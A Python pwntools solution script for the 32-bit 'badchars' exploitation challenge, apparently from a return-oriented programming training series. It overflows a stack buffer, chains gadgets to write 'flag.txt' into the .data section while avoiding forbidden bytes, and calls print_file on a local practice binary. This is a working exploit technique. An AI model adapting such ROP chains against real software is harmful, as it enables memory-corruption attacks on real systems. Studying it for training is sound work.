#!/usr/bin/python3
# solution to badchars

from pwn import *

padding = b'x' * 44   # Gets us to the return address on the stack
strspace = 0x0804a018    # Address of the .data section which is rw
add_gadget = 0x08048543  # add byte [ebp], bl ; ret
xor_gadget = 0x08048547  # xor byte [ebp], bl ; ret (didn't end up needing)
sub_gadget = 0x0804854b  # sub byte [ebp], bl ; ret (didn't end up needing)
mov_gadget = 0x0804854f  # mov dword [edi], esi ; ret
pop1ret = 0x080485bb     # pop ebp ; ret
pop2ret = 0x080485ba     # pop edi ; pop ebp ; ret
pop3ret = 0x080485b9     # pop esi ; pop edi ; pop ebp ; ret
pop4ret = 0x080485b8     # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
target = 0x080483d0      # plt print_file()

rop = padding

rop += p32(pop3ret)    # Return here and run
rop += b"fl\x60\x66"   # esi
rop += p32(strspace)   # edi
rop += p32(0xBADFACE)  # ebp
rop += p32(mov_gadget) # Return here and run: put's value in esi (fl\x60\x66) into the thing pointed to by edi (.data section)

rop += p32(pop3ret)         # Return here and run
rop += b"\x2Dt\x77t"        # esi
rop += p32(strspace + 0x4)  # edi
rop += p32(0xCAFEBABE)      # ebp
rop += p32(mov_gadget)      # Return here and run: put's value in esi (\x2Dt\x77t) into the thing pointed to by edi (.data + 0x4)

rop += p32(pop4ret)         # Return here and run
rop += p32(0x00000001)      # ebx
rop += p32(0xBEEFBABE)      # esi
rop += p32(0xBEEFBABE)      # edi
rop += p32(strspace + 0x2)  # ebp (address of \x60 byte in our string in the .data section)
rop += p32(add_gadget)      # Return here and run: Add value in the low 8-bits of ebx to the thing pointed at by ebp (add 1 to \x60 making it an 'a')

rop += p32(pop1ret)         # Return here and run
rop += p32(strspace + 0x3)  # ebp (address of \x66 byte in our string in the .data section)
rop += p32(add_gadget)      # Return here and run: Add value in the low 8-bits of ebx to the thing pointed at by ebp (add 1 to \x66 making it an 'g')

rop += p32(pop1ret)         # Return here and run
rop += p32(strspace + 0x4)  # ebp (address of \x2D byte in our string in the .data section)
rop += p32(add_gadget)      # Return here and run: Add value in the low 8-bits of ebx to the thing pointed at by ebp (add 1 to \x2D making it an '.')

rop += p32(pop1ret)         # Return here and run
rop += p32(strspace + 0x6)  # ebp (address of \x77 byte in our string in the .data section)
rop += p32(add_gadget)      # Return here and run: Add value in the low 8-bits of ebx to the thing pointed at by ebp (add 1 to \x77 making it an 'x')

rop += p32(target)          # Return here and run (address of .plt print_file)
rop += p32(pop3ret)         # Fix the stack
rop += p32(strspace)        # First argument to print_file (address of our string in memory)

with open("exploit", 'wb') as fh:
    fh.write(rop)

print("Current raw exploit written to 'exploit' for debugging.")
print("Launch in GDB and debug with 'run < exploit'")
print()

# Start the process
io = process("./badchars32")

# Read until the request for input
welcome = io.recvuntil(b">")

# Print the welcome message
print(welcome.decode())

# Send the exploit
io.sendline(rop)

# Get the result
print(io.recvall())
